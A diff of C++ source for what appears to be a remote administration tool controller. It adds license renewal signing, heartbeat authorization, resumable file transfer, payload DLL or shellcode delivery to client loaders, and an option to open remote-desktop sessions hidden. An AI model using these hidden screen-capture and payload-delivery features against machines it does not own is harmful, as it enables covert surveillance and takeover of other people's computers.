+    CTime expireTime(year, month, day, 0, 0, 0);
+    CTime now = CTime::GetCurrentTime();
+    CTime today(now.GetYear(), now.GetMonth(), now.GetDay(), 0, 0, 0);
+    CTimeSpan span = expireTime - today;
+    int days = (int)span.GetDays();
+    if (days <= 0) days = 1;
+
+    // 生成新的 passcode
+    char hostNum[10] = {};
+    sprintf(hostNum, "%04d", renewal.HostNum);
+    std::string password = getDateStr(0) + " - " + getDateStr(days) + ": " + pwdHash + ": " + hostNum;
+    std::string finalKey = deriveKey(password, sn);
+    std::string newPasscode = getDateStr(0) + "-" + getDateStr(days) + "-" + hostNum + "-" + getFixedLengthID(finalKey);
+
+    // 生成新的 hmac
+    std::string newHmac;
+    if (isV2) {
+        // V2 续期：使用 ECDSA 签名
+        std::string privateKeyPath = m_v2KeyPath;
+        if (!privateKeyPath.empty()) {
+            newHmac = signPasswordV2(sn, newPasscode, privateKeyPath.c_str());
+            if (newHmac.empty()) {
+                Mprintf("V2 续期签名失败: %s\n", sn.c_str());
+                // 降级到 V1
+                uint64_t hmacVal = SignMessage(m_superPass, (BYTE*)newPasscode.c_str(), (int)newPasscode.length());
+                newHmac = std::to_string(hmacVal);
+            }
+        } else {
+            Mprintf("V2 私钥未配置，降级到 V1: %s\n", sn.c_str());
+            uint64_t hmacVal = SignMessage(m_superPass, (BYTE*)newPasscode.c_str(), (int)newPasscode.length());
+            newHmac = std::to_string(hmacVal);
+        }
+    } else {
+        // V1 续期：使用 HMAC
+        uint64_t hmacVal = SignMessage(m_superPass, (BYTE*)newPasscode.c_str(), (int)newPasscode.length());
+        newHmac = std::to_string(hmacVal);
+    }
+
+    Mprintf("[TOKEN_AUTH] 生成续期: %s, %s -> %s, %d并发数, 配额剩余%d\n",
+            sn.c_str(), currentExpire.c_str(), renewal.ExpireDate.c_str(), renewal.HostNum, renewal.Quota - 1);
+
+    // 配额递减，配额用完后自动清除预设续期记录
+    DecrementPendingQuota(sn);
+
+    result.first = newPasscode;
+    result.second = newHmac;
+    return result;
+}
+
+// 统一的授权验证函数
+// source: 验证来源 ("AUTH"=TOKEN_AUTH, "HB"=心跳)
+// 返回: (authorized, isV2, isTrail, expired)
+// expired=true 表示签名有效但已过期（可用于续期）
+std::tuple<bool, bool, bool, bool> CMy2015RemoteDlg::VerifyClientAuth(context* host,
+    const std::string& sn, const std::string& passcode, uint64_t hmac,
+    const std::string& hmacV2, const std::string& ip, const char* source)
+{
+    bool authorized = false;
+    bool isV2 = false;
+    bool isTrail = false;
+    bool expired = false;
+
+    if (hmac == 0 && !hmacV2.empty() && hmacV2.substr(0, 3) == "v2:") {
+        // V2 授权验证
+        isV2 = true;
+        authorized = AuthorizeClientV2(host, sn, passcode, hmacV2, &expired);
+        if (authorized) {
+            if (host) {
+                m_ClientMap->SetClientMapInteger(host->GetClientID(), MAP_AUTH, TRUE);
+            }
+            isTrail = IsTrail(passcode.c_str());
+        }
+        if (ShouldLogAuth(sn, authorized)) {
+            if (authorized) {
+                Mprintf("[%s] %s V2 授权成功: %s [%s]\n", source, passcode.c_str(), sn.c_str(), ip.c_str());
+                std::string tip = passcode + std::string(_L(" V2 授权成功: ")) + sn + "[" + ip + "]";
+                PostMessageA(WM_SHOWMESSAGE, (WPARAM)new CharMsg(tip.c_str()), NULL);
+            } else {
+                Mprintf("[%s] %s V2 授权失败: %s [%s]\n", source, passcode.c_str(), sn.c_str(), ip.c_str());
+                std::string tip = passcode + std::string(_L(" V2 授权失败: ")) + sn + "[" + ip + "]";
+                PostMessageA(WM_SHOWMESSAGE, (WPARAM)new CharMsg(tip.c_str()), NULL);
+            }
+        }
+    } else if (!passcode.empty() && IsValidPasscodeFormat(passcode.c_str())) {
+        // V1 授权验证
+        isV2 = false;
+        authorized = AuthorizeClient(host, sn, passcode, hmac, &expired);
+        if (authorized) {
+            if (host) {
+                m_ClientMap->SetClientMapInteger(host->GetClientID(), MAP_AUTH, TRUE);
+            }
+            isTrail = IsTrail(passcode.c_str());
+        }
+        if (ShouldLogAuth(sn, authorized)) {
+            if (authorized) {
+                Mprintf("[%s] %s V1 授权成功: %s [%s]\n", source, passcode.c_str(), sn.c_str(), ip.c_str());
+                std::string tip = passcode + std::string(_L(" V1 授权成功: ")) + sn + "[" + ip + "]";
+                PostMessageA(WM_SHOWMESSAGE, (WPARAM)new CharMsg(tip.c_str()), NULL);
+            } else {
+                Mprintf("[%s] %s V1 授权失败: %s [%s]\n", source, passcode.c_str(), sn.c_str(), ip.c_str());
+                std::string tip = passcode + std::string(_L(" V1 授权失败: ")) + sn + "[" + ip + "]";
+                PostMessageA(WM_SHOWMESSAGE, (WPARAM)new CharMsg(tip.c_str()), NULL);
+            }
+        }
+    }
+
+    return std::make_tuple(authorized, isV2, isTrail, expired);
+}
+
+// 检查并发送预设续期（多点验证）
+void CMy2015RemoteDlg::SendPendingRenewal(CONTEXT_OBJECT* ctx, const std::string& sn,
+                                          const std::string& passcode, const char* source)
+{
+    RenewalInfo renewal = GetPendingRenewal(sn);
+    if (!renewal.IsValid() || m_superPass.empty()) {
+        return;
+    }
+
+    std::string currentExpire = ParseExpireDateFromPasscode(passcode);
+    if (currentExpire >= renewal.ExpireDate) {
+        return;  // 当前到期时间不小于预设到期时间，无需续期
+    }
+
+    // 计算从今天到过期日期的天数
+    int year = atoi(renewal.ExpireDate.substr(0, 4).c_str());
+    int month = atoi(renewal.ExpireDate.substr(4, 2).c_str());
+    int day = atoi(renewal.ExpireDate.substr(6, 2).c_str());
+    CTime expireTime(year, month, day, 0, 0, 0);
+    CTime now = CTime::GetCurrentTime();
+    CTime today(now.GetYear(), now.GetMonth(), now.GetDay(), 0, 0, 0);
+    CTimeSpan span = expireTime - today;
+    int days = (int)span.GetDays();
+    if (days <= 0) days = 1;
+
+    // 构建并发送 CMD_AUTHORIZATION
+    if (source) {
+        Mprintf("[%s] 自动下发续期: %s, %s -> %s, %d并发数\n",
+                source, sn.c_str(), currentExpire.c_str(), renewal.ExpireDate.c_str(), renewal.HostNum);
+    } else {
+        Mprintf("自动下发续期: %s, %s -> %s, %d并发数\n",
+                sn.c_str(), currentExpire.c_str(), renewal.ExpireDate.c_str(), renewal.HostNum);
+    }
+
+    BYTE bToken[32] = { CMD_AUTHORIZATION };
+    unsigned short usDays = (unsigned short)days;
+    unsigned short num = (unsigned short)renewal.HostNum;
+    uint32_t tm = clock();
+    memcpy(bToken + 1, &usDays, sizeof(usDays));
+    memcpy(bToken + 3, &num, sizeof(num));
+    memcpy(bToken + 8, &tm, sizeof(tm));
+    uint64_t signature = SignMessage(m_superPass, bToken, 12);
+    memcpy(bToken + 12, &signature, sizeof(signature));
+    ctx->Send2Client(bToken, sizeof(bToken));
+
+    // 配额递减，配额用完后自动清除预设续期记录
+    // 注意：必须在这里处理，因为心跳中的 SN 和请求中的 deviceID 可能不同
+    bool hasRemainingQuota = DecrementPendingQuota(sn);
+    Mprintf("[HEARTBEAT] 续期下发完成: %s, 剩余配额: %s\n", sn.c_str(), hasRemainingQuota ? "有" : "无");
+
+    // 提示续期已下发
+    std::string expireFmt = renewal.ExpireDate.substr(0, 4) + "-" +
+                            renewal.ExpireDate.substr(4, 2) + "-" +
+                            renewal.ExpireDate.substr(6, 2);
+    std::string tip = sn + g_Lang.Get(std::string(" 已自动续期至 ")) + expireFmt;
+    PostMessageA(WM_SHOWMESSAGE, (WPARAM)new CharMsg(tip.c_str()), NULL);
 }
 
 void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
@@ -2944,16 +5884,25 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
     // 回复心跳
     // if(0)
     {
-        BOOL authorized = AuthorizeClient(hb.SN, hb.Passcode, hb.PwdHmac);
+        // 检查是否为 V2 授权
+        std::string hmacV2(hb.PwdHmacV2);
+        // 去除末尾空字符
+        while (!hmacV2.empty() && hmacV2.back() == '\0')
+            hmacV2.pop_back();
+
+        // 统一的 V1/V2 授权验证
+        std::string ip = ctx->GetClientData(ONLINELIST_IP);
+        auto [authorized, isV2, isTrail, expired] = VerifyClientAuth(host, hb.SN, hb.Passcode, hb.PwdHmac, hmacV2, ip, "HB");
+        (void)expired;  // 心跳不需要处理过期续期
+
+        // 检查并发送预设续期（多点验证）
+        SendPendingRenewal(ctx, hb.SN, hb.Passcode, "Heartbeat");
+		int authStatus = authorized ? (!m_v2KeyPath.empty() ? AUTHED_BY_SUPER : AUTHED_BY_ADMIN) : UNAUTHORIZED;
+        HeartbeatACK ack = { hb.Time, (char)authStatus, (char)isTrail };
         if (authorized) {
-            Mprintf("%s HMAC 校验成功: %llu\n", hb.Passcode, hb.PwdHmac);
-            m_ClientMap->SetClientMapInteger(host->GetClientID(), MAP_AUTH, TRUE);
-            std::string tip = std::string(hb.Passcode) + std::string(_L("授权成功"));
-            tip += ": " + std::to_string(hb.PwdHmac) + "[" + std::string(ctx->GetClientData(ONLINELIST_IP)) + "]";
-            CharMsg* msg = new CharMsg(tip.c_str());
-            PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+            std::string authorization = isV2 ? LoadLicenseAuthorization(hb.SN) : BuildV1Authorization(hb.SN, true);
+            memcpy(ack.Authorization, authorization.c_str(), authorization.length());
         }
-        HeartbeatACK ack = { hb.Time, (char)authorized };
         BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
         memcpy(buf + 1, &ack, sizeof(HeartbeatACK));
         ctx->Send2Client(buf, sizeof(buf));
@@ -2961,24 +5910,63 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
     }
 
     CLock L(m_cs);
-    int n = m_CList_Online.GetItemCount();
-    for (int i = 0; i < n; ++i) {
-        context* id = (context*)m_CList_Online.GetItemData(i);
-        if (clientID == id->GetClientID()) {
-            m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
-            if (hb.Ping > 0)
-                m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
-            m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? _TR("有") : _TR("无"));
-			id->SetLastHeartbeat(time(0));
-            return;
+    // 使用索引快速查找
+    auto indexIt = m_ClientIndex.find(clientID);
+    if (indexIt != m_ClientIndex.end() && indexIt->second < m_HostList.size()) {
+        context* id = m_HostList[indexIt->second];
+        if (id) {
+            bool changed = false;
+            // 只在数据变化时标记 dirty
+            CString oldActiveWnd = ctx->GetClientData(ONLINELIST_LOGINTIME);
+            if (oldActiveWnd != hb.ActiveWnd) {
+                ctx->SetClientData(ONLINELIST_LOGINTIME, hb.ActiveWnd);
+                changed = true;
+            }
+            if (hb.Ping > 0) {
+                CString newPing = std::to_string(hb.Ping).c_str();
+                if (ctx->GetClientData(ONLINELIST_PING) != newPing) {
+                    ctx->SetClientData(ONLINELIST_PING, newPing);
+                    changed = true;
+                }
+            }
+            CString newVideo = hb.HasSoftware ? _TR("有") : _TR("无");
+            if (ctx->GetClientData(ONLINELIST_VIDEO) != newVideo) {
+                ctx->SetClientData(ONLINELIST_VIDEO, newVideo);
+                changed = true;
+            }
+            id->SetLastHeartbeat(time(0));
+            if (changed) {
+                m_DirtyClients.insert(clientID);
+
+                // Notify web clients of device update
+                if (WebService().IsRunning()) {
+                    std::string rtt = hb.Ping > 0 ? std::to_string(hb.Ping) : "";
+                    // Convert ANSI to UTF-8 for web
+                    std::string activeWnd;
+                    CString csActiveWnd(hb.ActiveWnd);
+                    if (!csActiveWnd.IsEmpty()) {
+                        int wlen = MultiByteToWideChar(CP_ACP, 0, csActiveWnd, -1, NULL, 0);
+                        if (wlen > 0) {
+                            std::wstring wstr(wlen - 1, L'\0');
+                            MultiByteToWideChar(CP_ACP, 0, csActiveWnd, -1, &wstr[0], wlen);
+                            int u8len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+                            if (u8len > 0) {
+                                activeWnd.resize(u8len - 1);
+                                WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &activeWnd[0], u8len, NULL, NULL);
+                            }
+                        }
+                    }
+                    WebService().NotifyDeviceUpdate(clientID, rtt, activeWnd);
+                }
+            }
         }
     }
 }
 
 // 根据套接字端口寻找对应的在线主机, 返回在线主机 context
-context* CMy2015RemoteDlg::FindHost(int port)
+context* CMy2015RemoteDlg::FindHostNoLock(int port)
 {
-    CLock L(m_cs);
+    // caller must hold m_cs lock
     for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
         if ((*i)->GetPort() == port) {
             return *i;
@@ -2987,10 +5975,16 @@ context* CMy2015RemoteDlg::FindHost(int port)
     return NULL;
 }
 
-// 根据ID寻找对应的在线主机, 返回在线主机 context
-context* CMy2015RemoteDlg::FindHost(uint64_t id)
+context* CMy2015RemoteDlg::FindHost(int port)
 {
     CLock L(m_cs);
+    return FindHostNoLock(port);
+}
+
+// 根据ID寻找对应的在线主机, 返回在线主机 context
+context* CMy2015RemoteDlg::FindHostNoLock(uint64_t id)
+{
+    // caller must hold m_cs lock
     for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
         if ((*i)->GetClientID() == id) {
             return *i;
@@ -2999,10 +5993,16 @@ context* CMy2015RemoteDlg::FindHost(uint64_t id)
     return NULL;
 }
 
-void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
+context* CMy2015RemoteDlg::FindHost(uint64_t id)
+{
+    CLock L(m_cs);
+    return FindHostNoLock(id);
+}
+
+void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx, const MasterSettings& m)
 {
     BYTE buf[sizeof(MasterSettings) + 1] = { CMD_MASTERSETTING };
-    memcpy(buf+1, &m_settings, sizeof(MasterSettings));
+    memcpy(buf+1, &m, sizeof(MasterSettings));
 
     if (ctx) {
         ctx->Send2Client(buf, sizeof(buf));
@@ -3018,6 +6018,260 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
     }
 }
 
+// V2 文件发送到客户端：回调数据结构
+struct SendV2CallbackData {
+    uint64_t clientID;  // 用客户端ID而不是指针，因为context可能被复用
+    CDlgFileSend* dlg;
+};
+
+// V2 文件发送到客户端的回调函数
+static bool SendFileChunkToClientV2(void* user, FileChunkPacketV2* chunk, unsigned char* data, int size)
+{
+    SendV2CallbackData* cbData = (SendV2CallbackData*)user;
+    if (!cbData) {
+        Mprintf("【V2传输】 回调数据为空\n");
+        return false;
+    }
+
+    // 通过ID查找客户端，检查是否仍然在线
+    context* ctx = g_2015RemoteDlg->FindHost(cbData->clientID);
+    if (!ctx) {
+        Mprintf("【V2传输】 客户端已断开 (clientID=%llu)，停止传输\n", cbData->clientID);
+        return false;
+    }
+
+    // 发送数据
+    BOOL sent = ctx->Send2Client(data, size);
+    if (!sent) {
+        Mprintf("【V2传输】 Send2Client 失败: size=%d, clientID=%llu\n", size, cbData->clientID);
+    }
+
+    // FILE_COMPLETE_V2 包结构不同，跳过进度更新
+    if (data[0] == COMMAND_FILE_COMPLETE_V2) {
+        Mprintf("【V2传输】 发送校验包\n");
+        return sent != FALSE;
+    }
+
+    // 更新进度
+    if (cbData->dlg && chunk) {
+        BYTE* name = data + sizeof(FileChunkPacketV2);
+        CString fileName((char*)name, (int)chunk->nameLength);
+        cbData->dlg->UpdateProgress(fileName, FileProgressInfo(chunk));
+    }
+
+    return sent != FALSE;
+}
+
+void CMy2015RemoteDlg::SendFilesToClientV2(context* mainCtx, const std::vector<std::string>& files, const std::string& targetDir)
+{
+    if (!mainCtx || files.empty()) return;
+
+    uint64_t clientID = mainCtx->GetClientID();
+
+    // 检查是否有未完成的相同传输（复用 transferID 实现续传）
+    uint64_t existingTransferID = 0;
+    {
+        std::lock_guard<std::mutex> lock(g_pendingTransfersV2Mtx);
+        for (auto& pair : g_pendingTransfersV2) {
+            if (pair.second.clientID == clientID && pair.second.files == files) {
+                existingTransferID = pair.first;
+                Mprintf("【V2传输】 找到未完成传输, 复用 transferID=%llu\n", existingTransferID);
+                break;
+            }
+        }
+    }
+
+    if (existingTransferID) {
+        // 复用已有的 transferID，无需等待客户端响应偏移（客户端会通过 COMMAND_FILE_QUERY_RESUME 回复）
+        SendFilesToClientV2Internal(mainCtx, files, existingTransferID, {}, targetDir);
+    } else {
+        SendFilesToClientV2Internal(mainCtx, files, 0, {}, targetDir);
+    }
+}
+
+// 内部实现，支持断点续传
+void CMy2015RemoteDlg::SendFilesToClientV2Internal(context* mainCtx, const std::vector<std::string>& files,
+    uint64_t resumeTransferID, const std::map<uint32_t, uint64_t>& startOffsets, const std::string& targetDir)
+{
+    if (!mainCtx || files.empty()) return;
+
+    // 续传使用原transferID，新传输生成新ID
+    uint64_t transferID = resumeTransferID ? resumeTransferID : GenerateTransferID();
+    CONTEXT_OBJECT* ctxObj = dynamic_cast<CONTEXT_OBJECT*>(mainCtx);
+
+    // 创建进度对话框
+    CDlgFileSend* dlg = nullptr;
+    if (ctxObj) {
+        dlg = new CDlgFileSend(this, ctxObj->GetServer(), ctxObj, TRUE);
+        dlg->m_bKeepConnection = TRUE;  // V2传输使用主连接，关闭对话框时不断开
+        dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
+        dlg->ShowWindow(SW_HIDE);  // 首次显示由 UpdateProgress 触发
+        dlg->SetWindowTextA(resumeTransferID ? _TR("续传文件 (V2)") : _TR("发送文件 (V2)"));
+    }
+
+    // 保存客户端ID（用于后续查找，因为context可能被复用）
+    uint64_t clientID = mainCtx->GetClientID();
+
+    // 保存传输状态（用于断点续传）
+    if (!resumeTransferID) {
+        std::lock_guard<std::mutex> lock(g_pendingTransfersV2Mtx);
+        g_pendingTransfersV2[transferID] = { clientID, files, GetTickCount() };
+        Mprintf("【V2传输】 保存传输状态, transferID=%llu, files=%zu\n", transferID, files.size());
+    }
+
+    // 先通知客户端准备接收（捕获当前目录）- 续传时或已指定目标目录时不需要
+    if (!resumeTransferID && targetDir.empty()) {
+        C2CPreparePacket prepare = {};
+        prepare.cmd = COMMAND_C2C_PREPARE;
+        prepare.transferID = transferID;
+        prepare.srcClientID = 0;  // 主控端
+        mainCtx->Send2Client((BYTE*)&prepare, sizeof(prepare));
+        Mprintf("【V2传输】 通知客户端准备, transferID=%llu\n", transferID);
+    }
+
+    // 续传时先发送查询
+    if (resumeTransferID) {
+        // 构建续传查询包
+        std::vector<std::pair<std::string, uint64_t>> fileInfos;
+        for (const auto& f : files) {
+            WIN32_FILE_ATTRIBUTE_DATA fad;
+            if (GetFileAttributesExA(f.c_str(), GetFileExInfoStandard, &fad)) {
+                uint64_t size = ((uint64_t)fad.nFileSizeHigh << 32) | fad.nFileSizeLow;
+                // 提取文件名（不含路径）
+                size_t pos = f.find_last_of("\\/");
+                std::string name = (pos != std::string::npos) ? f.substr(pos + 1) : f;
+                fileInfos.push_back({name, size});
+            }
+        }
+        auto queryPkt = BuildResumeQuery(transferID, 0, clientID, fileInfos);
+        if (!queryPkt.empty()) {
+            mainCtx->Send2Client(queryPkt.data(), (UINT)queryPkt.size());
+            Mprintf("【V2传输】 发送续传查询, transferID=%llu, files=%zu\n", transferID, fileInfos.size());
+        }
+    }
+
+    // 在新线程中发送文件
+    std::thread([this, clientID, files, transferID, dlg, startOffsets, resumeTransferID, targetDir]() {
+        // 检查程序是否正在退出
+        if (g_bAppExiting) return;
+
+        // 等待客户端准备/响应
+        if (resumeTransferID) {
+            Sleep(500);  // 等待续传响应
+        } else if (targetDir.empty()) {
+            Sleep(500);  // 等待 COMMAND_C2C_PREPARE 处理完成（增加到500ms以支持Linux客户端）
+        }
+
+        // 再次检查退出标志
+        if (g_bAppExiting) return;
+
+        // 检查客户端是否还在线
+        context* ctx = FindHost(clientID);
+        if (!ctx) {
+            Mprintf("【V2传输】 客户端已断开 (clientID=%llu)，取消传输\n", clientID);
+            if (dlg) dlg->FinishFileSend(FALSE);
+            return;
+        }
+        Mprintf("【V2传输】 开始传输, clientID=%llu, files=%zu\n", clientID, files.size());
+
+        // 获取续传偏移（从全局状态）
+        std::map<uint32_t, uint64_t> offsets = startOffsets;
+        if (resumeTransferID && offsets.empty()) {
+            // 尝试获取客户端响应的偏移
+            if (WaitForResumeOffsets(offsets, 2500)) {
+                Mprintf("【V2传输】 收到续传偏移: %zu 个文件\n", offsets.size());
+            } else {
+                Mprintf("【V2传输】 未收到续传偏移，从头开始\n");
+            }
+        }
+
+        std::string hash = GetPwdHash();
+        std::string hmac = GetHMAC(100);
+
+        TransferOptionsV2 opts = {};
+        opts.transferID = transferID;
+        opts.srcClientID = 0;  // 服务端
+        opts.dstClientID = clientID;
+        opts.enableResume = false;  // 已手动处理
+        opts.startOffsets = offsets;
+
+        // 使用包含对话框的回调数据（用clientID而不是指针）
+        SendV2CallbackData cbData = { clientID, dlg };
+        int result = FileBatchTransferWorkerV2(files, targetDir, &cbData, SendFileChunkToClientV2, nullptr, hash, hmac, opts);
+
+        // 检查最终结果：传输函数返回0且客户端仍在线才算成功
+        bool success = (result == 0) && (FindHost(clientID) != nullptr);
+        Mprintf("【V2传输】 %s, transferID=%llu, result=%d\n", success ? "完成" : "失败", transferID, result);
+
+        // 传输完成，清理状态
+        if (success) {
+            std::lock_guard<std::mutex> lock(g_pendingTransfersV2Mtx);
+            g_pendingTransfersV2.erase(transferID);
+        }
+
+        // 通知完成（先检查程序是否正在退出）
+        if (!g_bAppExiting && dlg && ::IsWindow(dlg->GetSafeHwnd())) {
+            dlg->FinishFileSend(success);
+        }
+    }).detach();
+}
+
+// 处理客户端的续传请求（服务端是源）
+void CMy2015RemoteDlg::HandleFileResumeRequest(CONTEXT_OBJECT* ctx, const BYTE* data, size_t len)
+{
+    if (len < sizeof(FileResumePacketV2)) {
+        Mprintf("[V2续传] 请求包太短: %zu\n", len);
+        return;
+    }
+
+    const FileResumePacketV2* pkt = (const FileResumePacketV2*)data;
+    uint64_t transferID = pkt->transferID;
+    uint64_t clientID = pkt->dstClientID;
+
+    // 查找待续传的传输
+    PendingTransferV2 transfer;
+    {
+        std::lock_guard<std::mutex> lock(g_pendingTransfersV2Mtx);
+        auto it = g_pendingTransfersV2.find(transferID);
+        if (it == g_pendingTransfersV2.end()) {
+            Mprintf("[V2续传] 未找到传输记录: transferID=%llu\n", transferID);
+            return;
+        }
+        transfer = it->second;
+    }
+
+    // 验证客户端ID
+    if (transfer.clientID != clientID) {
+        Mprintf("[V2续传] 客户端ID不匹配: 期望=%llu, 实际=%llu\n", transfer.clientID, clientID);
+        return;
+    }
+
+    // 解析已接收的区间，计算起始偏移
+    std::map<uint32_t, uint64_t> startOffsets;
+
+    // 从请求中获取 receivedBytes 作为起始偏移
+    // 注意：当前实现简化为单文件，使用 receivedBytes 作为偏移
+    uint32_t fileIndex = pkt->fileIndex;
+    uint64_t receivedBytes = pkt->receivedBytes;
+
+    if (receivedBytes > 0) {
+        startOffsets[fileIndex] = receivedBytes;
+        Mprintf("[V2续传] 文件 %u 从偏移 %llu 开始续传\n", fileIndex, receivedBytes);
+    }
+
+    // 获取当前客户端的 context（可能已经是新的连接）
+    context* mainCtx = FindHost(clientID);
+    if (!mainCtx) {
+        Mprintf("[V2续传] 客户端不在线: %llu\n", clientID);
+        return;
+    }
+
+    Mprintf("[V2续传] 开始续传: transferID=%llu, files=%zu\n", transferID, transfer.files.size());
+
+    // 调用内部函数开始续传
+    SendFilesToClientV2Internal(mainCtx, transfer.files, transferID, startOffsets);
+}
+
 bool isAllZeros(const BYTE* data, int len)
 {
     for (int i = 0; i < len; ++i)
@@ -3031,6 +6285,13 @@ BOOL CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
     auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
     auto buf = isDLL ? m_ServerDLL[id] : m_ServerBin[id];
     if (buf->length()) {
+        // 检查旧客户端是否能接收大 DLL (旧 test.cpp 客户端 bufSize=4MB)
+        // 注：SHELLCODE 请求来自 main.c，一直是 8MB，不需要检查
+        const size_t OLD_CLIENT_MAX_SIZE = 4 * 1024 * 1024;
+        if (isDLL && buf->length() > OLD_CLIENT_MAX_SIZE) {
+            Mprintf("[SendServerDll] DLL size %.2f MB: use TinyRunDLL instead.\n", buf->length()/1024.);
+			buf = is64Bit ? m_TinyRun[PAYLOAD_DLL_X64] : m_TinyRun[PAYLOAD_DLL_X86];
+        }
         // 只有发送了IV的加载器才支持AES加密
         int len = ContextObject->InDeCompressedBuffer.GetBufferLength();
         bool hasIV = len >= 32 && !isAllZeros(ContextObject->InDeCompressedBuffer.GetBuffer(16), 16);
@@ -3059,8 +6320,13 @@ LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
     if (mainCtx) ContextObject->SetPeerName(mainCtx->GetClientData(ONLINELIST_IP).GetString());
     if (dlg) {
         if (GetRemoteWindow(dlg))
-            return dlg->UpdateContext(ContextObject);
+            return dlg->UpdateContext(ContextObject, clientID);
         Mprintf("收到远程桌面打开消息, 对话框已经销毁: %llu\n", dlgID);
+        BYTE bToken = COMMAND_BYE;
+        return ContextObject->Send2Client(&bToken, 1) ? 0 : 0x20260223;
+    }
+    if (clientID && WebService().IsRunning() && WebService().IsWebTriggered(clientID) && WebService().GetHideWebSessions()) {
+        return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_HIDE>(wParam, lParam);
     }
     return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_SHOWMAXIMIZED>(wParam, lParam);
 }
@@ -3078,6 +6344,12 @@ LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
 LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 {
     return OpenDialog<CShellDlg, IDD_DIALOG_SHELL>(wParam, lParam);
+}
+
+LRESULT CMy2015RemoteDlg::OnOpenTerminalDialog(WPARAM wParam, LPARAM lParam)
+{
+    // 复用 ShellDlg 的对话框模板，TerminalDlg 会在初始化时替换 Edit 为 WebView2
+    return OpenDialog<CTerminalDlg, IDD_DIALOG_SHELL>(wParam, lParam);
 }
 
 
@@ -3159,6 +6431,16 @@ BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
         return TRUE;
     }
 
+    // Ctrl+F 显示搜索栏
+    if (pMsg->message == WM_KEYDOWN && pMsg->wParam == 'F' &&
+        (GetKeyState(VK_CONTROL) & 0x8000)) {
+        if (!m_pSearchBar) {
+            m_pSearchBar = new CSearchBarDlg(this);
+        }
+        m_pSearchBar->Show();
+        return TRUE;
+    }
+
     if ((pMsg->message == WM_LBUTTONDOWN || pMsg->message == WM_RBUTTONDOWN) && m_pFloatingTip) {
         HWND hTipWnd = m_pFloatingTip->GetSafeHwnd();
         if (::IsWindow(hTipWnd)) {
@@ -3203,6 +6485,7 @@ void CMy2015RemoteDlg::OnOnlineShare()
 {
     CInputDialog dlg(this);
     dlg.Init(_TR("分享主机"), _TR("输入<IP:PORT>地址:"));
+    dlg.SetHistoryKey("ShareAddress");
     if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
         return;
     if (dlg.m_str.GetLength() >= 250) {
@@ -3254,7 +6537,8 @@ void CMy2015RemoteDlg::OnMainProxy()
     POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        context* ContextObject = GetContextByListIndex(iItem);
+        if (!ContextObject) continue;
         BYTE cmd[] = { COMMAND_PROXY };
         ContextObject->Send2Client( cmd, sizeof(cmd));
         break;
@@ -3279,9 +6563,11 @@ void CMy2015RemoteDlg::OnOnlineHostnote()
     POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        context* ContextObject = GetContextByListIndex(iItem);
+        if (!ContextObject) continue;
         m_ClientMap->SetClientMapData(ContextObject->GetClientID(), MAP_NOTE, dlg.m_str);
-        m_CList_Online.SetItemText(iItem, ONLINELIST_COMPUTER_NAME, dlg.m_str);
+        // 虚拟列表：刷新该行以显示新备注
+        m_CList_Online.RedrawItems(iItem, iItem);
         modified = TRUE;
     }
     LeaveCriticalSection(&m_cs);
@@ -3427,8 +6713,11 @@ bool UPXUncompressFile(const std::string& upx, std::string &file)
             return false;
         }
         int result = run_upx(upx, file, false);
-        Mprintf("UPX decompression %s!\n", result ? "failed" : "successful");
-        return 0 == result;
+        // UPX 返回码: 0=成功, 1=错误, 2=警告（如文件未压缩）
+        // 0 和 2 视为成功（目标是得到未压缩的文件）
+        bool success = (result == 0 || result == 2);
+        Mprintf("UPX decompression %s! Code: %d.\n", success ? "successful" : "failed", result);
+        return success;
     }
     return false;
 }
@@ -3469,15 +6758,112 @@ LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam)
 
 //////////////////////////////////////////////////////////////////////////
 
+// 生成下级代理所需的哈希头文件
+bool GenerateHashHeaderFile(const std::string& headerPath,
+                            const std::string& pwdHash, const Validation& verify,
+                            const std::string& masterHash,
+                            const FeatureFlags* newFlags = nullptr)
+{
+    // 输入验证
+    if (pwdHash.length() != 64 || masterHash.length() != 64) {
+        Mprintf("错误: 哈希长度无效 (pwdHash=%d, masterHash=%d)\n",
+                (int)pwdHash.length(), (int)masterHash.length());
+        return false;
+    }
+
+    std::ofstream headerFile(headerPath);
+    if (!headerFile.is_open()) {
